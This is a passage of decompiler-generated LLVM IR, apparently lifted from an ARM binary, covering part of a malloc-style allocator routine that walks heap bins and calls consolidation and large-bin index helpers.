  %v18_124e0 = load i32, i32* @sb, align 4
  %v21_124e0 = load i32, i32* @sl, align 4
  %v24_124e0 = load i32, i32* @fp, align 4
  %v27_124e0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_124f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 108) to i32*), align 4
  store i32 %v4_124f4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12500 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), align 4
  store i32 %v4_12500, i32* %r1.global-to-local, align 4
  %v0_12504 = load i32, i32* @r0, align 4
  store i32 %v0_12504, i32* @r5, align 4
  store i32 %v4_124f4, i32* %r2.global-to-local, align 4
  %v2_1250c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1250c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v4_12518 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  store i32 %v4_12518, i32* %ip.global-to-local, align 4
  store i32 75044, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12518)
  %v0_12524 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12524, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r1, align 4
  %v4_12530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 16) to i32*), align 4
  store i32 %v4_12530, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1253c.445 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12530)
  %v0_1253c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1253c, -32
  br i1 %tmp, label %dec_label_pc_12560, label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_fcd8.171 to i32), i32* %r2.global-to-local, align 4
  %v0_12548 = call i32 @__aeabi_read_tp()
  store i32 %v0_12548, i32* %r0.global-to-local, align 4
  %v3_1254c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1254c = sext i16 %v3_1254c to i32
  store i32 %v4_1254c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12558 = add i32 %v4_1254c, %v0_12548
  %v4_12558 = inttoptr i32 %v3_12558 to i32*
  store i32 12, i32* %v4_12558, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12560:                               ; preds = %entry
  %v1_12560 = add i32 %v0_1253c, 11
  store i32 %v1_12560, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v2_1256c = icmp ugt i32 %v1_12560, 14
  %v7_1256c = icmp eq i32 %v1_12560, 15
  %v2_12570 = xor i1 %v7_1256c, true
  %v3_12570 = and i1 %v2_1256c, %v2_12570
  br i1 %v3_12570, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_12560
  %v5_12570 = and i32 %v1_12560, -8
  store i32 %v5_12570, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_12560, %bb
  %v4_12574 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12574, i32* @r0, align 4
  %v1_12578 = inttoptr i32 %v4_12574 to i32*
  %v2_12578 = load i32, i32* %v1_12578, align 4
  store i32 %v2_12578, i32* @r4, align 4
  %v2_1257c = xor i1 %v2_1256c, true
  %v3_1257c = or i1 %v7_1256c, %v2_1257c
  br i1 %v3_1257c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_12580 = urem i32 %v2_12578, 2
  %v2_12580 = icmp eq i32 %v1_12580, 0
  br i1 %v2_12580, label %dec_label_pc_12588, label %dec_label_pc_12598

dec_label_pc_12588:                               ; preds = %bb143
  %v2_12588 = icmp eq i32 %v2_12578, 0
  br i1 %v2_12588, label %dec_label_pc_12590, label %dec_label_pc_12974

dec_label_pc_12590:                               ; preds = %dec_label_pc_12588
  %v0_12590 = call i32 @__malloc_consolidate()
  store i32 %v0_12590, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12974

dec_label_pc_12598:                               ; preds = %bb143
  %v0_12598 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_12598, %v2_12578
  br i1 %tmp204, label %dec_label_pc_125c0, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_12598
  %v1_125a0 = add i32 %v4_12574, -4
  store i32 %v1_125a0, i32* %r1.global-to-local, align 4
  %v3_125a4 = udiv i32 %v0_12598, 8
  store i32 %v3_125a4, i32* %r2.global-to-local, align 4
  %v4_125a8 = mul nuw i32 %v3_125a4, 4
  %v5_125a8 = add i32 %v4_125a8, %v1_125a0
  %v6_125a8 = inttoptr i32 %v5_125a8 to i32*
  %v7_125a8 = load i32, i32* %v6_125a8, align 4
  store i32 %v7_125a8, i32* %r0.global-to-local, align 4
  %v2_125ac = icmp eq i32 %v7_125a8, 0
  br i1 %v2_125ac, label %dec_label_pc_125c0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_125a0
  %v2_125b0 = add i32 %v7_125a8, 8
  %v3_125b0 = inttoptr i32 %v2_125b0 to i32*
  %v4_125b0 = load i32, i32* %v3_125b0, align 4
  store i32 %v4_125b0, i32* %r3.global-to-local, align 4
  store i32 %v2_125b0, i32* %r0.global-to-local, align 4
  store i32 %v2_125b0, i32* %r4.global-to-local, align 4
  store i32 %v4_125b0, i32* %v6_125a8, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125a0, %dec_label_pc_12598
  %tmp205 = icmp ugt i32 %v0_12598, 255
  br i1 %tmp205, label %dec_label_pc_12610, label %dec_label_pc_125c8

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125c0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_125d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  %v3_125d4 = udiv i32 %v0_12598, 8
  store i32 %v3_125d4, i32* @r7, align 4
  %v4_125d8 = mul nuw i32 %v3_125d4, 8
  %v5_125d8 = add i32 %v4_125d0, %v4_125d8
  store i32 %v5_125d8, i32* %r3.global-to-local, align 4
  %v1_125dc = add i32 %v5_125d8, 44
  store i32 %v1_125dc, i32* %ip.global-to-local, align 4
  %v1_125e0 = add i32 %v5_125d8, 56
  %v2_125e0 = inttoptr i32 %v1_125e0 to i32*
  %v3_125e0 = load i32, i32* %v2_125e0, align 4
  store i32 %v3_125e0, i32* %r0.global-to-local, align 4
  %v9_125e4 = icmp eq i32 %v3_125e0, %v1_125dc
  br i1 %v9_125e4, label %dec_label_pc_12770, label %dec_label_pc_125ec

dec_label_pc_125ec:                               ; preds = %dec_label_pc_125c8
  %v2_125ec = add i32 %v3_125e0, %v0_12598
  store i32 %v2_125ec, i32* %r3.global-to-local, align 4
  %v1_125f0 = add i32 %v2_125ec, 4
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* %r2.global-to-local, align 4
  %v1_125f4 = add i32 %v3_125e0, 12
  %v2_125f4 = inttoptr i32 %v1_125f4 to i32*
  %v3_125f4 = load i32, i32* %v2_125f4, align 4
  store i32 %v3_125f4, i32* %r1.global-to-local, align 4
  %v1_125f8 = or i32 %v3_125f0, 1
  store i32 %v1_125f8, i32* %r2.global-to-local, align 4
  %v1_125fc = add i32 %v3_125e0, 8
  store i32 %v1_125fc, i32* %r4.global-to-local, align 4
  store i32 %v1_125f8, i32* %v2_125f0, align 4
  %v0_12604 = load i32, i32* %ip.global-to-local, align 4
  %v1_12604 = load i32, i32* %r1.global-to-local, align 4
  %v2_12604 = add i32 %v1_12604, 8
  %v3_12604 = inttoptr i32 %v2_12604 to i32*
  store i32 %v0_12604, i32* %v3_12604, align 4
  %v0_12608 = load i32, i32* %r1.global-to-local, align 4
  %v1_12608 = load i32, i32* %ip.global-to-local, align 4
  %v2_12608 = add i32 %v1_12608, 12
  %v3_12608 = inttoptr i32 %v2_12608 to i32*
  store i32 %v0_12608, i32* %v3_12608, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12610:                               ; preds = %dec_label_pc_125c0
  store i32 %v0_12598, i32* %r0.global-to-local, align 4
  %v1_12614 = call i32 @__malloc_largebin_index(i32 %v0_12598)
  store i32 %v1_12614, i32* %r0.global-to-local, align 4
  %v0_12618 = load i32, i32* @r4, align 4
  %v1_12618 = and i32 %v0_12618, 2
  %v2_12618 = icmp eq i32 %v1_12618, 0
  store i32 %v1_12614, i32* @r7, align 4
  br i1 %v2_12618, label %dec_label_pc_12770, label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_12610
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_1262c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_1262c, i32* @r0, align 4
  %v0_12630 = call i32 @__malloc_consolidate()
  store i32 %v0_12630, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12770

dec_label_pc_12638:                               ; preds = %dec_label_pc_12784
  %v1_12638 = add i32 %v3_12784, 4
  %v2_12638 = inttoptr i32 %v1_12638 to i32*
  %v3_12638 = load i32, i32* %v2_12638, align 4
  store i32 %v3_12638, i32* %r3.global-to-local, align 4
  %v0_1263c = load i32, i32* @sl, align 4
  %v1_12640 = and i32 %v3_12638, -4
  store i32 %v1_12640, i32* %r4.global-to-local, align 4
  %v1_12644 = add i32 %v3_12784, 12
  %v2_12644 = inttoptr i32 %v1_12644 to i32*
  %v3_12644 = load i32, i32* %v2_12644, align 4
  store i32 %v3_12644, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1263c, 255
  br i1 %tmp206, label %dec_label_pc_126a0, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12638
  %v9_1264c = icmp eq i32 %v3_12644, %v0_126a4
  br i1 %v9_1264c, label %dec_label_pc_12654, label %dec_label_pc_126a0

dec_label_pc_12654:                               ; preds = %dec_label_pc_1264c
  %v0_12654 = load i32, i32* @sb, align 4
  %v1_12654 = add i32 %v0_12654, 48
  %v2_12654 = inttoptr i32 %v1_12654 to i32*
  %v3_12654 = load i32, i32* %v2_12654, align 4
  store i32 %v3_12654, i32* %r3.global-to-local, align 4
  %v9_12658 = icmp eq i32 %v3_12784, %v3_12654
  br i1 %v9_12658, label %dec_label_pc_12660, label %dec_label_pc_126a0

dec_label_pc_12660:                               ; preds = %dec_label_pc_12654
  %v1_12660 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_12640, %v1_12660
  br i1 %tmp207, label %dec_label_pc_12668, label %dec_label_pc_126a0

dec_label_pc_12668:                               ; preds = %dec_label_pc_12660
  %v2_12668 = sub i32 %v1_12640, %v0_1263c
  store i32 %v2_12668, i32* %r2.global-to-local, align 4
  %v2_1266c = add i32 %v0_1263c, %v3_12784
  store i32 %v2_1266c, i32* %r3.global-to-local, align 4
  %v1_12670 = or i32 %v0_1263c, 1
  store i32 %v1_12670, i32* %r0.global-to-local, align 4
  %v1_12674 = or i32 %v2_12668, 1
  store i32 %v1_12674, i32* %r1.global-to-local, align 4
  %v1_12678 = add i32 %v3_12784, 8
  store i32 %v1_12678, i32* %r4.global-to-local, align 4
  %v2_1267c = add i32 %v0_126a4, 8
  %v3_1267c = inttoptr i32 %v2_1267c to i32*
  store i32 %v2_1266c, i32* %v3_1267c, align 4
  %v0_12680 = load i32, i32* %r3.global-to-local, align 4
  %v1_12680 = load i32, i32* %ip.global-to-local, align 4
  %v2_12680 = add i32 %v1_12680, 12
  %v3_12680 = inttoptr i32 %v2_12680 to i32*
  store i32 %v0_12680, i32* %v3_12680, align 4
  %v0_12684 = load i32, i32* %r0.global-to-local, align 4
  %v1_12684 = load i32, i32* @r6, align 4
  %v2_12684 = add i32 %v1_12684, 4
  %v3_12684 = inttoptr i32 %v2_12684 to i32*
  store i32 %v0_12684, i32* %v3_12684, align 4
  %v0_12688 = load i32, i32* %r3.global-to-local, align 4
  %v1_12688 = load i32, i32* @sb, align 4
  %v2_12688 = add i32 %v1_12688, 48
  %v3_12688 = inttoptr i32 %v2_12688 to i32*
  store i32 %v0_12688, i32* %v3_12688, align 4
  %v0_1268c = load i32, i32* %r2.global-to-local, align 4
  %v1_1268c = load i32, i32* %r3.global-to-local, align 4
  %v3_1268c = add i32 %v1_1268c, %v0_1268c
  %v4_1268c = inttoptr i32 %v3_1268c to i32*
  store i32 %v0_1268c, i32* %v4_1268c, align 4
  %v0_12690 = load i32, i32* %r1.global-to-local, align 4
  %v1_12690 = load i32, i32* %r3.global-to-local, align 4
  %v2_12690 = add i32 %v1_12690, 4
  %v3_12690 = inttoptr i32 %v2_12690 to i32*
  store i32 %v0_12690, i32* %v3_12690, align 4
  %v0_12694 = load i32, i32* %ip.global-to-local, align 4
  %v1_12694 = load i32, i32* %r3.global-to-local, align 4
  %v2_12694 = add i32 %v1_12694, 12
  %v3_12694 = inttoptr i32 %v2_12694 to i32*
  store i32 %v0_12694, i32* %v3_12694, align 4
  %v0_12698 = load i32, i32* %ip.global-to-local, align 4
  %v1_12698 = load i32, i32* %r3.global-to-local, align 4
  %v2_12698 = add i32 %v1_12698, 8
  %v3_12698 = inttoptr i32 %v2_12698 to i32*
  store i32 %v0_12698, i32* %v3_12698, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_126a0:                               ; preds = %dec_label_pc_12660, %dec_label_pc_12654, %dec_label_pc_1264c, %dec_label_pc_12638
  %v9_126a0 = icmp eq i32 %v1_12640, %v0_1263c
  %v2_126a4 = add i32 %v3_12644, 8
  %v3_126a4 = inttoptr i32 %v2_126a4 to i32*
  store i32 %v0_126a4, i32* %v3_126a4, align 4
  %v0_126a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_126a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_126a8 = add i32 %v1_126a8, 12
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  store i32 %v0_126a8, i32* %v3_126a8, align 4
  br i1 %v9_126a0, label %dec_label_pc_12800.loopexit, label %dec_label_pc_126bc

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126a0
  %v0_126bc = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_126bc, 255
  br i1 %tmp208, label %dec_label_pc_126e0, label %dec_label_pc_126c4

dec_label_pc_126c4:                               ; preds = %dec_label_pc_126bc
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v1_126c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_126c8 = add i32 %v1_126c8, ptrtoint (i32* @global_var_221d4.362 to i32)
  %v3_126c8 = inttoptr i32 %v2_126c8 to i32*
  %v4_126c8 = load i32, i32* %v3_126c8, align 4
  %v3_126cc = udiv i32 %v0_126bc, 8
  store i32 %v3_126cc, i32* %r0.global-to-local, align 4
  %v4_126d0 = mul nuw i32 %v3_126cc, 8
  %v5_126d0 = add i32 %v4_126c8, %v4_126d0
  store i32 %v5_126d0, i32* %r3.global-to-local, align 4
  %v1_126d4 = add i32 %v5_126d0, 44
  store i32 %v1_126d4, i32* %ip.global-to-local, align 4
  %v1_126d8 = add i32 %v5_126d0, 52
  %v2_126d8 = inttoptr i32 %v1_126d8 to i32*
  %v3_126d8 = load i32, i32* %v2_126d8, align 4
  store i32 %v3_126d8, i32* @lr, align 4
  br label %dec_label_pc_12738

dec_label_pc_126e0:                               ; preds = %dec_label_pc_126bc
  store i32 %v0_126bc, i32* %r0.global-to-local, align 4
  %v1_126e4 = call i32 @__malloc_largebin_index(i32 %v0_126bc)
  store i32 %v1_126e4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %ip.global-to-local, align 4
  %v1_126ec = load i32, i32* %r8.global-to-local, align 4
  %v2_126ec = add i32 %v1_126ec, ptrtoint (i32* @global_var_221d4.362 to i32)
  %v3_126ec = inttoptr i32 %v2_126ec to i32*
  %v4_126ec = load i32, i32* %v3_126ec, align 4
  %v4_126f0 = mul i32 %v1_126e4, 8
  %v5_126f0 = add i32 %v4_126ec, %v4_126f0
  store i32 %v5_126f0, i32* %r3.global-to-local, align 4
  %v1_126f4 = add i32 %v5_126f0, 44
  store i32 %v1_126f4, i32* %ip.global-to-local, align 4
  %v1_126f8 = add i32 %v5_126f0, 52
  %v2_126f8 = inttoptr i32 %v1_126f8 to i32*
  %v3_126f8 = load i32, i32* %v2_126f8, align 4
  store i32 %v3_126f8, i32* @lr, align 4
  %v9_126fc = icmp eq i32 %v3_126f8, %v1_126f4
  br i1 %v9_126fc, label %dec_label_pc_12738, label %dec_label_pc_12704

dec_label_pc_12704:                               ; preds = %dec_label_pc_126e0
  %v1_12704 = add i32 %v5_126f0, 56
  %v2_12704 = inttoptr i32 %v1_12704 to i32*
  %v3_12704 = load i32, i32* %v2_12704, align 4
  store i32 %v3_12704, i32* %r1.global-to-local, align 4
  %v1_12708 = add i32 %v3_12704, 4
  %v2_12708 = inttoptr i32 %v1_12708 to i32*
  %v3_12708 = load i32, i32* %v2_12708, align 4
  store i32 %v3_12708, i32* %r3.global-to-local, align 4
  %v0_1270c = load i32, i32* %r4.global-to-local, align 4
  %v3_1270c = icmp ult i32 %v0_1270c, %v3_12708
  br i1 %v3_1270c, label %.thread, label %dec_label_pc_12728.preheader

.thread:                                          ; preds = %dec_label_pc_12704
  store i32 %v1_126f4, i32* @lr, align 4
  store i32 %v3_12704, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12738

dec_label_pc_12728.preheader:                     ; preds = %dec_label_pc_12704
  %v2_12714 = or i32 %v0_1270c, 1
  store i32 %v2_12714, i32* %r2.global-to-local, align 4
  %v1_12728182 = add i32 %v3_126f8, 4
  %v2_12728183 = inttoptr i32 %v1_12728182 to i32*
  %v3_12728184 = load i32, i32* %v2_12728183, align 4
  store i32 %v3_12728184, i32* %r3.global-to-local, align 4
  %v3_1272c186 = icmp ult i32 %v2_12714, %v3_12728184
  br i1 %v3_1272c186, label %dec_label_pc_12724, label %dec_label_pc_12734

dec_label_pc_12724:                               ; preds = %dec_label_pc_12728.preheader, %dec_label_pc_12724
  %v0_12734187 = phi i32 [ %v3_12724, %dec_label_pc_12724 ], [ %v3_126f8, %dec_label_pc_12728.preheader ]
  %v1_12724 = add i32 %v0_12734187, 8
  %v2_12724 = inttoptr i32 %v1_12724 to i32*
  %v3_12724 = load i32, i32* %v2_12724, align 4
  store i32 %v3_12724, i32* @lr, align 4
  %v1_12728 = add i32 %v3_12724, 4
  %v2_12728 = inttoptr i32 %v1_12728 to i32*
  %v3_12728 = load i32, i32* %v2_12728, align 4
  store i32 %v3_12728, i32* %r3.global-to-local, align 4
  %v3_1272c = icmp ult i32 %v2_12714, %v3_12728
  br i1 %v3_1272c, label %dec_label_pc_12724, label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_12724, %dec_label_pc_12728.preheader
  %v0_12734.lcssa = phi i32 [ %v3_126f8, %dec_label_pc_12728.preheader ], [ %v3_12724, %dec_label_pc_12724 ]
  %v1_12734 = add i32 %v0_12734.lcssa, 12
  %v2_12734 = inttoptr i32 %v1_12734 to i32*
  %v3_12734 = load i32, i32* %v2_12734, align 4
  store i32 %v3_12734, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %.thread, %dec_label_pc_126e0, %dec_label_pc_126c4, %dec_label_pc_12734
  %v0_12758 = phi i32 [ %v1_126f4, %dec_label_pc_126e0 ], [ %v1_126d4, %dec_label_pc_126c4 ], [ %v3_12734, %dec_label_pc_12734 ], [ %v3_12704, %.thread ]
  %v0_1274c = phi i32 [ %v1_126e4, %dec_label_pc_126e0 ], [ %v3_126cc, %dec_label_pc_126c4 ], [ %v1_126e4, %dec_label_pc_12734 ], [ %v1_126e4, %.thread ]
  %v1_1273c = phi i32 [ %v1_126ec, %dec_label_pc_126e0 ], [ %v1_126c8, %dec_label_pc_126c4 ], [ %v1_126ec, %dec_label_pc_12734 ], [ %v1_126ec, %.thread ]
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v2_1273c = add i32 %v1_1273c, ptrtoint (i32* @global_var_221d4.362 to i32)
  %v3_1273c = inttoptr i32 %v2_1273c to i32*
  %v4_1273c = load i32, i32* %v3_1273c, align 4
  %v3_12740 = sdiv i32 %v0_1274c, 32
  store i32 %v3_12740, i32* %r3.global-to-local, align 4
  %v4_12744 = mul nsw i32 %v3_12740, 4
  %v5_12744 = add i32 %v4_1273c, %v4_12744
  store i32 %v5_12744, i32* %r1.global-to-local, align 4
  %v1_12748 = add i32 %v5_12744, 820
  %v2_12748 = inttoptr i32 %v1_12748 to i32*
  %v3_12748 = load i32, i32* %v2_12748, align 4
  %v1_1274c = urem i32 %v0_1274c, 32
  store i32 %v1_1274c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12754 = shl i32 1, %v1_1274c
  %v8_12754 = or i32 %v3_12748, %v7_12754
  store i32 %v8_12754, i32* %r3.global-to-local, align 4
  %v1_12758 = load i32, i32* @r6, align 4
  %v2_12758 = add i32 %v1_12758, 12
  %v3_12758 = inttoptr i32 %v2_12758 to i32*
  store i32 %v0_12758, i32* %v3_12758, align 4
  %v0_1275c = load i32, i32* @lr, align 4
  %v1_1275c = load i32, i32* @r6, align 4
  %v2_1275c = add i32 %v1_1275c, 8
  %v3_1275c = inttoptr i32 %v2_1275c to i32*
  store i32 %v0_1275c, i32* %v3_1275c, align 4
  %v0_12760 = load i32, i32* %r3.global-to-local, align 4
  %v1_12760 = load i32, i32* %r1.global-to-local, align 4
  %v2_12760 = add i32 %v1_12760, 820
  %v3_12760 = inttoptr i32 %v2_12760 to i32*
  store i32 %v0_12760, i32* %v3_12760, align 4
  %v0_12764 = load i32, i32* @r6, align 4
  %v1_12764 = load i32, i32* @lr, align 4
  %v2_12764 = add i32 %v1_12764, 12
  %v3_12764 = inttoptr i32 %v2_12764 to i32*
  store i32 %v0_12764, i32* %v3_12764, align 4
  %v0_12768 = load i32, i32* @r6, align 4
  %v1_12768 = load i32, i32* %ip.global-to-local, align 4
  %v2_12768 = add i32 %v1_12768, 8
  %v3_12768 = inttoptr i32 %v2_12768 to i32*
  store i32 %v0_12768, i32* %v3_12768, align 4
  %v0_12784.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12784

dec_label_pc_12770:                               ; preds = %dec_label_pc_12610, %dec_label_pc_125c8, %dec_label_pc_12624
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_12778 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_12778, i32* @sb, align 4
  %v0_1277c = load i32, i32* @sl, align 4
  %v1_1277c = add i32 %v0_1277c, 16
  store i32 %v1_1277c, i32* @fp, align 4
  %v1_12780 = add i32 %v4_12778, 52
  store i32 %v1_12780, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_12738, %dec_label_pc_12770
  %v0_126a4 = phi i32 [ %v0_12784.pre, %dec_label_pc_12738 ], [ %v1_12780, %dec_label_pc_12770 ]
  %v1_12784 = add i32 %v0_126a4, 12
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  store i32 %v3_12784, i32* @r6, align 4
  %v9_12788 = icmp eq i32 %v3_12784, %v0_126a4
  br i1 %v9_12788, label %dec_label_pc_12790, label %dec_label_pc_12638

dec_label_pc_12790:                               ; preds = %dec_label_pc_12784
  %v0_12790 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_12790, 256
  %v0_12848.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_12790.dec_label_pc_12848_crit_edge, label %dec_label_pc_12798

dec_label_pc_12790.dec_label_pc_12848_crit_edge:  ; preds = %dec_label_pc_12790
  %.pre203 = mul i32 %v0_12848.pre, 8
  br label %dec_label_pc_12848

dec_label_pc_12798:                               ; preds = %dec_label_pc_12790
  %v4_12798 = mul i32 %v0_12848.pre, 8
  %v5_12798 = add i32 %v4_12798, %v0_126a4
  store i32 %v5_12798, i32* %r3.global-to-local, align 4
  %v1_1279c = add i32 %v5_12798, -8
  store i32 %v1_1279c, i32* %r1.global-to-local, align 4
  %v1_127a0 = add i32 %v5_12798, 4
  %v2_127a0 = inttoptr i32 %v1_127a0 to i32*
  %storemerge.pre = load i32, i32* %v2_127a0, align 4
  br label %dec_label_pc_12840

dec_label_pc_127a8:                               ; preds = %dec_label_pc_12840
  %v1_127a8 = add i32 %v1_127d0, 4
  %v2_127a8 = inttoptr i32 %v1_127a8 to i32*
  %v3_127a8 = load i32, i32* %v2_127a8, align 4
  store i32 %v3_127a8, i32* %r3.global-to-local, align 4
  %v1_127ac = and i32 %v3_127a8, -4
  store i32 %v1_127ac, i32* %r2.global-to-local, align 4
  %v3_127b0 = icmp ult i32 %v1_127ac, %v0_12790
  %v1_127b4 = add i32 %v1_127d0, 12
  %v2_127b4 = inttoptr i32 %v1_127b4 to i32*
  %v3_127b4 = load i32, i32* %v2_127b4, align 4
  store i32 %v3_127b4, i32* %r0.global-to-local, align 4
  br i1 %v3_127b0, label %dec_label_pc_12840, label %dec_label_pc_127bc

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127a8
  %v1_127bc = add i32 %v1_127d0, 8
  %v2_127bc = inttoptr i32 %v1_127bc to i32*
  %v3_127bc = load i32, i32* %v2_127bc, align 4
  store i32 %v3_127bc, i32* %r1.global-to-local, align 4
  %v1_127c0 = add i32 %v3_127bc, 12
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  store i32 %v3_127c0, i32* %r3.global-to-local, align 4
  %v9_127c4 = icmp eq i32 %v3_127c0, %v1_127d0
  br i1 %v9_127c4, label %dec_label_pc_127cc, label %dec_label_pc_127d8

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127bc
  %v1_127cc = add i32 %v3_127b4, 8
  %v2_127cc = inttoptr i32 %v1_127cc to i32*
  %v3_127cc = load i32, i32* %v2_127cc, align 4
  store i32 %v3_127cc, i32* %r3.global-to-local, align 4
  %v9_127d0 = icmp eq i32 %v3_127cc, %v1_127d0
  br i1 %v9_127d0, label %dec_label_pc_127dc, label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127bc, %dec_label_pc_127cc
  %v0_127d8 = call i32 @abort()
  store i32 %v0_127d8, i32* %r0.global-to-local, align 4
  %v0_127dc.pre = load i32, i32* @sl, align 4
  %v1_127dc.pre = load i32, i32* @r2, align 4
  %v0_127e4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_127dc

dec_label_pc_127dc:                               ; preds = %dec_label_pc_127cc, %dec_label_pc_127d8
  %v1_127e4 = phi i32 [ %v3_127b4, %dec_label_pc_127cc ], [ %v0_127d8, %dec_label_pc_127d8 ]
  %v0_127e4 = phi i32 [ %v3_127bc, %dec_label_pc_127cc ], [ %v0_127e4.pre, %dec_label_pc_127d8 ]
  %v1_127dc = phi i32 [ %v1_127ac, %dec_label_pc_127cc ], [ %v1_127dc.pre, %dec_label_pc_127d8 ]
  %v0_127dc = phi i32 [ %v0_12790, %dec_label_pc_127cc ], [ %v0_127dc.pre, %dec_label_pc_127d8 ]
  %v2_127dc = sub i32 %v1_127dc, %v0_127dc
  store i32 %v2_127dc, i32* %lr.global-to-local, align 4
  %v2_127e4 = add i32 %v1_127e4, 8
  %v3_127e4 = inttoptr i32 %v2_127e4 to i32*
  store i32 %v0_127e4, i32* %v3_127e4, align 4
  %v0_127e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_127e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_127e8 = add i32 %v1_127e8, 12
  %v3_127e8 = inttoptr i32 %v2_127e8 to i32*
  store i32 %v0_127e8, i32* %v3_127e8, align 4
  %v0_127ec = load i32, i32* %ip.global-to-local, align 4
  %v1_127ec = add i32 %v0_127ec, 8
  store i32 %v1_127ec, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_127dc, 15
  br i1 %tmp210, label %dec_label_pc_1280c, label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127dc
  %v1_127f4 = load i32, i32* %r2.global-to-local, align 4
